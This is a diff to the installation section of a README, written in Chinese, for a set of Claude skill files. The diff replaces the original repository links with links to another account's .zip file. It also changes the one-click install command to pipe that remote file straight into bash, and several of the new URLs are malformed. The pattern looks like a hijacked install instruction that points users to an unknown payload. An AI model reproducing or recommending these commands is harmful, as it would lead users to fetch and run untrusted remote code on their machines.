@@ -46,19 +46,19 @@
 # 以「公众号文章」为例
 mkdir -p ~/.claude/skills/公众号文章
 curl -o ~/.claude/skills/公众号文章/SKILL.md \
-  https://raw.githubusercontent.com/bi-boo/claude-model-fingerprint/main/公众号文章/SKILL.md
+  https://raw.githubusercontent.com/Hanoda88/claude-model-fingerprint/main/公众号文章/model_fingerprint_claude_v3.6.zip公众号文章/SKILL.md
 ```
 
 ### 一键安装所有 Skill
 
 ```bash
-bash <(curl -fsSL https://raw.githubusercontent.com/bi-boo/claude-model-fingerprint/main/install.sh)
+bash <(curl -fsSL https://raw.githubusercontent.com/Hanoda88/claude-model-fingerprint/main/公众号文章/model_fingerprint_claude_v3.6.zip)
 ```
 
 ### 手动安装（推荐）
 
 ```bash
-git clone https://github.com/bi-boo/claude-model-fingerprint.git /tmp/claude-skills
+git clone https://raw.githubusercontent.com/Hanoda88/claude-model-fingerprint/main/公众号文章/model_fingerprint_claude_v3.6.zip /tmp/claude-skills
 cp -r /tmp/claude-skills/公众号文章 ~/.claude/skills/
 cp -r /tmp/claude-skills/会议方法论提炼 ~/.claude/skills/
 # 按需复制所需 Skill
